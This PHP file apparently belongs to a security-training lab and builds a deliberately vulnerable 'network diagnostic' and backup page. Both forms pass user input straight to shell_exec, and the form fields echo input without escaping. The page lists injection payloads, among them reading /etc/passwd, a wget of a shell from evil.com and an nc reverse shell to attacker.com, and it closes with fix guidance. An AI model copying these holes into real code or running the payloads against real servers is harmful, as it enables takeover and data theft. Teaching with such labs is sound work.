<?php
// VULNERABLE COMMAND INJECTION PAGE
// WARNING: FOR TRAINING PURPOSES ONLY - DO NOT USE IN PRODUCTION

session_start();
include("config-vulnerable.php");

// Vulnerable: Display all errors
error_reporting(E_ALL);
ini_set('display_errors', 1);

$output = "";
$command_executed = "";

if(isset($_POST['ping'])) {
    // VULNERABILITY #1: COMMAND INJECTION
    // User input passed directly to system command without sanitization
    $host = $_POST['host'];
    
    // Different vulnerable command examples
    if(isset($_POST['action'])) {
        switch($_POST['action']) {
            case 'ping':
                // VULNERABILITY: Direct shell command execution
                $command = "ping -c 4 " . $host;
                break;
            case 'nslookup':
                $command = "nslookup " . $host;
                break;
            case 'traceroute':
                $command = "traceroute " . $host;
                break;
            default:
                $command = "ping -c 4 " . $host;
        }
    } else {
        $command = "ping -c 4 " . $host;
    }
    
    $command_executed = $command;
    
    // VULNERABILITY #2: Using dangerous functions
    // shell_exec, exec, system, passthru are all dangerous with user input
    $output = shell_exec($command . " 2>&1");
}

if(isset($_POST['backup'])) {
    // VULNERABILITY #3: File operations with user input
    $filename = $_POST['filename'];
    $command = "tar -czf /tmp/" . $filename . " /var/www/html/uploads";
    $command_executed = $command;
    $output = shell_exec($command . " 2>&1");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Vulnerable Command Injection - Training</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <style>
        .warning-banner {
            background: #ff0000;
            color: white;
            padding: 15px;
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .vulnerability-info {
            background: #fff3cd;
            border: 2px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .command-output {
            background: #000;
            color: #0f0;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="warning-banner">
        ⚠️ VULNERABLE VERSION - FOR SECURITY TRAINING ONLY ⚠️
    </div>
    
    <div class="container">
        <div class="row">
            <div class="col-md-10 offset-md-1">
                <div class="vulnerability-info">
                    <h5>🎯 Training Target: Command Injection</h5>
                    <p><strong>Vulnerabilities Present:</strong></p>
                    <ul>
                        <li>Direct execution of user input in shell commands</li>
                        <li>No input validation or sanitization</li>
                        <li>Use of dangerous PHP functions (shell_exec, system, exec)</li>
                        <li>Command output displayed to user</li>
                        <li>No command whitelisting</li>
                    </ul>
                    <p><strong>Try:</strong> <code>127.0.0.1; cat /etc/passwd</code> or <code>127.0.0.1 && ls -la</code></p>
                </div>

                <div class="card mb-4">
                    <div class="card-header">
                        <h3>Network Diagnostic Tool (Vulnerable)</h3>
                    </div>
                    <div class="card-body">
                        <form method="post" action="">
                            <div class="form-group">
                                <label>Host/IP Address:</label>
                                <input type="text" class="form-control" name="host" 
                                       placeholder="e.g., google.com or 8.8.8.8"
                                       value="<?php echo isset($_POST['host']) ? $_POST['host'] : ''; ?>">
                                <small class="form-text text-muted">
                                    Try command injection: <code>127.0.0.1; whoami</code> or <code>8.8.8.8 && cat /etc/passwd</code>
                                </small>
                            </div>
                            
                            <div class="form-group">
                                <label>Action:</label>
                                <select class="form-control" name="action">
                                    <option value="ping">Ping</option>
                                    <option value="nslookup">NSLookup</option>
                                    <option value="traceroute">Traceroute</option>
                                </select>
                            </div>
                            
                            <button type="submit" name="ping" class="btn btn-primary">
                                Execute Command
                            </button>
                        </form>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header">
                        <h3>Backup Tool (Vulnerable)</h3>
                    </div>
                    <div class="card-body">
                        <form method="post" action="">
                            <div class="form-group">
                                <label>Backup Filename:</label>
                                <input type="text" class="form-control" name="filename" 
                                       placeholder="backup.tar.gz"
                                       value="<?php echo isset($_POST['filename']) ? $_POST['filename'] : ''; ?>">
                                <small class="form-text text-muted">
                                    Try: <code>backup.tar.gz; cat /etc/passwd</code> or <code>test.tar.gz && ls -la /</code>
                                </small>
                            </div>
                            
                            <button type="submit" name="backup" class="btn btn-warning">
                                Create Backup
                            </button>
                        </form>
                    </div>
                </div>

                <?php if(!empty($command_executed)): ?>
                    <div class="card mb-4">
                        <div class="card-header">
                            <h5>Command Executed:</h5>
                        </div>
                        <div class="card-body">
                            <code><?php echo htmlspecialchars($command_executed); ?></code>
                        </div>
                    </div>
                    
                    <div class="card mb-4">
                        <div class="card-header">
                            <h5>Command Output:</h5>
                        </div>
                        <div class="card-body">
                            <div class="command-output"><?php echo htmlspecialchars($output); ?></div>
                        </div>
                    </div>
                <?php endif; ?>

                <div class="vulnerability-info">
                    <h6>💡 Learning Points:</h6>
                    <ol>
                        <li>User input is directly concatenated into shell commands</li>
                        <li>No input validation or sanitization is performed</li>
                        <li>Shell metacharacters (;, &&, ||, |, `, $, etc.) allow command chaining</li>
                        <li>Dangerous PHP functions execute arbitrary commands</li>
                    </ol>
                    
                    <h6>🔍 Command Injection Techniques:</h6>
                    <pre>Semicolon (;):     127.0.0.1; whoami
AND operator (&&): 127.0.0.1 && cat /etc/passwd  
OR operator (||):  invalid || ls -la
Pipe (|):          127.0.0.1 | cat /etc/passwd
Backticks (`):     127.0.0.1`whoami`
Command sub ($):   127.0.0.1$(whoami)
Newline (%0a):     127.0.0.1%0awhoami</pre>
                    
                    <h6>🎯 What You Can Do:</h6>
                    <pre>Read files:        ; cat /etc/passwd
List directories:  && ls -la /
View environment:  ; env
Current user:      && whoami
System info:       ; uname -a
Network config:    && ifconfig
Process list:      ; ps aux
Create files:      && touch /tmp/hacked.txt
Download shell:    ; wget http://evil.com/shell.php
Reverse shell:     && nc -e /bin/sh attacker.com 4444</pre>
                    
                    <h6>🛡️ How to Fix:</h6>
                    <pre>1. Never pass user input to shell commands
2. Use built-in PHP functions instead:
   - Use fsockopen() instead of ping
   - Use dns_get_record() instead of nslookup
   
3. If you must use system commands:
   - Whitelist allowed commands
   - Use escapeshellarg() and escapeshellcmd()
   - Validate input against strict regex
   - Drop privileges before execution
   
Example:
$allowed_hosts = ['google.com', 'cloudflare.com'];
if(in_array($_POST['host'], $allowed_hosts)) {
    $safe_host = escapeshellarg($_POST['host']);
    $output = shell_exec("ping -c 4 " . $safe_host);
}</pre>
                </div>

                <div class="vulnerability-info mt-3">
                    <h6>⚠️ Real-World Impact:</h6>
                    <ul>
                        <li><strong>Remote Code Execution (RCE):</strong> Complete server takeover</li>
                        <li><strong>Data Exfiltration:</strong> Steal sensitive files and databases</li>
                        <li><strong>Privilege Escalation:</strong> Gain root access</li>
                        <li><strong>Backdoor Installation:</strong> Persistent access</li>
                        <li><strong>Lateral Movement:</strong> Attack internal network</li>
                        <li><strong>Ransomware:</strong> Encrypt server files</li>
                    </ul>
                </div>

                <div class="mt-3">
                    <a href="user-login-sqli.php">← Back to Login</a> | 
                    <a href="search-xss.php">XSS Training →</a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
